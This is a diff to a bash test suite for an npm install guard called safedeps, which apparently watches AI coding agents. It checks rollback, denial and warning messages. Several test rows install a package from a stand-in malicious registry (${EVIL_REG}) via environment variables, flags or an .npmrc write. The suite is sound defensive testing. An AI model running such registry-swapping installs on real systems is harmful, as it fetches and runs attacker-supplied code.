@@ -85,6 +85,10 @@ new_uuidproject() { CASE_PARENT="${UUID_DIR}"; new_project; CASE_PARENT=""; }
 new_uuidworkspace() { CASE_PARENT="${UUID_DIR}"; new_workspace; CASE_PARENT=""; }
 
 post_ungated_lines() { grep 'post-verify UNGATED' "${CASE_HOME}/advisory.log" 2>/dev/null || true; }
+# What an install that left no trace is recorded as: the check that found none.
+NO_TRACE_CHECK='neither npm lockfile there is newer than the baseline taken before this command or has another inode'
+# The lines of the post hook's message, for a check of one whole line.
+post_message_lines() { jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null; }
 
 # One row. <id>|<fixture>|<cwd>|<engine>|<expect>|<command>
 # <expect>: rollback | ungated-trace | ungated-attrib | quiet, or read: rolled
@@ -131,12 +135,13 @@ run_row() {
       [[ -z "${victim}" ]] || note_failure "${id}: the rollback removes sd-victim from disk (${victim})"
       ;;
     ungated-trace)
-      # The record says what it does not know: where the install went, or
-      # whether it installed anything. Section 1b checks the directory it names.
+      # The record says the check that found no trace, and does not guess where
+      # the install went or whether it installed anything. Section 1b checks
+      # the directory it names.
       post_ungated_lines | grep -qF "post-verify UNGATED: no install trace in " \
         || note_failure "${id}: recorded UNGATED as an install with no trace ($(post_ungated_lines | cut -f2 | head -c 200))"
-      post_ungated_lines | grep -qF 'the install landed elsewhere or installed nothing' \
-        || note_failure "${id}: the record says the install landed elsewhere or installed nothing"
+      post_ungated_lines | grep -qF "${NO_TRACE_CHECK}" \
+        || note_failure "${id}: the record says which check found no trace"
       [[ "${engine}" == codex ]] || ! grep -q '^sd-' <<< "${CASE_RAN}" \
         || note_failure "${id}: nothing is rebuilt where the install left no trace (${CASE_RAN})"
       ;;
@@ -144,7 +149,7 @@ run_row() {
       if [[ "${rb}" == yes ]]; then
         [[ -z "${victim}" ]] || note_failure "${id}: the rollback removes sd-victim from disk (${victim})"
       else
-        post_ungated_lines | grep -qF 'the install landed elsewhere or installed nothing' \
+        post_ungated_lines | grep -qF "${NO_TRACE_CHECK}" \
           || note_failure "${id}: rolled back, or recorded UNGATED as an install with no trace (post: ${CASE_POST:-<quiet>})"
       fi
       ;;
@@ -1039,6 +1044,10 @@ new_un1() { new_project; quiet_first "unset npm_config_userconfig; HOME=${XH_HOM
 #   quiet:<package>     confirmed quietly, and <package> rebuilt (`-`: nothing to check)
 #   denied:<reason>     the pre-guard denies it, saying <reason>; nothing is installed
 # A `fallback` may carry `:<text>` that the message must also say.
+# RH3c is RH3x with a record of the rewrite that the command did not carry
+# (engine `crossed`, npm-sandbox.sh): the Codex warning used to be left out
+# whenever the record said safedeps rewrote a command, and is now left out only
+# where the command received is the one it wrote.
 # The warning a later command gets for the impostor an earlier one fetched.
 WITHHELD_EVIL="the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from ${EVIL_REG}, which is not the public npm registry. They are kept. safedeps has recorded these bytes and withholds their install scripts in every project on this machine. This version has no way to release them: no tree that holds them is rebuilt automatically until a later release can approve a registry. If you trust that registry, confirm with the user before running \`npm rebuild sd-approved\` yourself; do not rebuild without asking"
 printf '# install scripts over the whole tree (id engine command | outcome)\n'
@@ -1075,32 +1084,33 @@ while IFS= read -r row; do
       rolled_back || note_failure "${id}: rolled back (post: ${CASE_POST:-<quiet>})"
       [[ "${expect}" == fallback ]] || grep -qF "${expect#fallback:}" <<< "${CASE_POST}" \
         || note_failure "${id}: the message says ${expect#fallback:} (post: ${CASE_POST:0:400})"
-      grep -qF 'no confirmed snapshot' <<< "${CASE_POST}" || note_failure "${id}: the message says there is no confirmed snapshot (post: ${CASE_POST:0:300})"
-      grep -qF 'no confirmed snapshot' <<< "${reorg_new}" || note_failure "${id}: reorg.log says there is no confirmed snapshot (${reorg_new:0:300})"
+      grep -qF 'no confirmed snapshot names it' <<< "${CASE_POST}" || note_failure "${id}: the message says no confirmed snapshot names the one it restored (post: ${CASE_POST:0:300})"
+      grep -qF 'no confirmed snapshot names it' <<< "${reorg_new}" || note_failure "${id}: reorg.log says no confirmed snapshot names the one it restored (${reorg_new:0:300})"
       grep -qF 'REORG with no confirmed snapshot' <<< "${advisory_new}" || note_failure "${id}: advisory.log says there is no confirmed snapshot (${advisory_new:0:300})"
-      grep -qF 'last confirmed safe snapshot' <<< "${CASE_POST}" && note_failure "${id}: the message does not claim a confirmed snapshot"
+      grep -qF ', a confirmed snapshot' <<< "${CASE_POST}" && note_failure "${id}: the message does not claim a confirmed snapshot"
       [[ -z "${CASE_RAN}" ]] || note_failure "${id}: the rollback runs no install script (${CASE_RAN})"
       # What ran before the rollback differs by engine, and so must the words.
+      # The line says what safedeps did: on Claude the command it wrote is the
+      # one the post hook received, on Codex it wrote none. In all three records.
       if [[ "${engine}" == codex ]]; then
         grep -q '^sd-victim' "${MARKS}" || note_failure "${id}: on Codex the install itself runs sd-victim's scripts, or this row tests nothing"
-        grep -qF "the install's own scripts already ran, the rejected package's included" <<< "${CASE_POST}" \
-          || note_failure "${id}: the message says the install's own scripts already ran (post: ${CASE_POST:0:400})"
-        grep -qF 'and no install script was run' <<< "${CASE_POST}" && note_failure "${id}: the message does not say no install script was run"
-        grep -qF 'its own scripts ran unless the command said --ignore-scripts' <<< "${advisory_new}" \
-          || note_failure "${id}: advisory.log says the install's own scripts ran (${advisory_new:0:300})"
+        scripts_line='safedeps did not add --ignore-scripts to this install'
       else
-        grep -qF 'and no install script was run' <<< "${CASE_POST}" \
-          || note_failure "${id}: the message says no install script was run (post: ${CASE_POST:0:400})"
-        grep -qF 'install scripts were not run' <<< "${advisory_new}" \
-          || note_failure "${id}: advisory.log says install scripts were not run (${advisory_new:0:300})"
+        scripts_line='safedeps added --ignore-scripts to this install'
       fi
+      post_message_lines | grep -qxF "${scripts_line}" \
+        || note_failure "${id}: the message says: ${scripts_line} (post: ${CASE_POST:0:400})"
+      grep -qxF "  ${scripts_line}" <<< "${reorg_new}" \
+        || note_failure "${id}: reorg.log says: ${scripts_line} (${reorg_new:0:300})"
+      grep -qF "; ${scripts_line}. Reasons: " <<< "${advisory_new}" \
+        || note_failure "${id}: advisory.log says: ${scripts_line} (${advisory_new:0:300})"
       ;;
     removed)
       rolled_back || note_failure "${id}: rolled back (post: ${CASE_POST:-<quiet>})"
-      grep -qF 'last confirmed safe snapshot' <<< "${CASE_POST}" || note_failure "${id}: rolled back to the confirmed snapshot (post: ${CASE_POST:0:300})"
+      grep -qF ', a confirmed snapshot' <<< "${CASE_POST}" || note_failure "${id}: rolled back to the confirmed snapshot (post: ${CASE_POST:0:300})"
       [[ -z "${CASE_RAN}" ]] || note_failure "${id}: the rollback runs no install script (${CASE_RAN})"
       [[ ! -e "${CASE_PROJECT}/node_modules" ]] || note_failure "${id}: the rollback removes the project's node_modules ($(ls "${CASE_PROJECT}/node_modules" 2>&1 | paste -sd, -))"
-      grep -qF 'node_modules was removed' <<< "${CASE_POST}" || note_failure "${id}: the message says node_modules was removed (post: ${CASE_POST:0:400})"
+      post_message_lines | grep -qx 'removed .*/node_modules' || note_failure "${id}: the message says node_modules was removed (post: ${CASE_POST:0:400})"
       ;;
     kept:*)
       ! rolled_back || note_failure "${id}: not rolled back (post: ${CASE_POST:0:300})"
@@ -1147,6 +1157,7 @@ RH2|evilclone|claude|kept:because this install fetched sd-approved from ${EVIL_R
 RH3|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
 RH3e|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0
 RH3x|project|codex|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not make the install inert (on Codex it cannot), so unless the command said --ignore-scripts, their install scripts already ran during the install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
+RH3c|project|crossed|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not make the install inert (on Codex it cannot), so unless the command said --ignore-scripts, their install scripts already ran during the install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
 RH4|project|claude|denied:Command uses non-standard npm registry|npm install --registry ${EVIL_REG} sd-approved@1.0.0
 RH5|project|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 RH1w|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|printf 'registry=${EVIL_REG}\n' > .npmrc && npm install sd-approved@1.0.0
@@ -1282,7 +1293,7 @@ do
   : > "${MARKS}"
   run_install "${form}"
   where=$(cd "${CASE_PROJECT}/${where}" && pwd -P)
-  post_ungated_lines | grep -qF "no install trace in ${where}: the install landed elsewhere or installed nothing" \
+  post_ungated_lines | grep -qF "no install trace in ${where}: ${NO_TRACE_CHECK}" \
     || note_failure "the record names the directory the gate read: ${form} (${where}; $(post_ungated_lines | cut -f2 | head -c 200))"
   grep -qF "no install trace in ${where}" <<< "${CASE_POST}" \
     || note_failure "the user is told, on Claude Code, that nothing was verified or rebuilt: ${form} (post: ${CASE_POST:-<quiet>})"
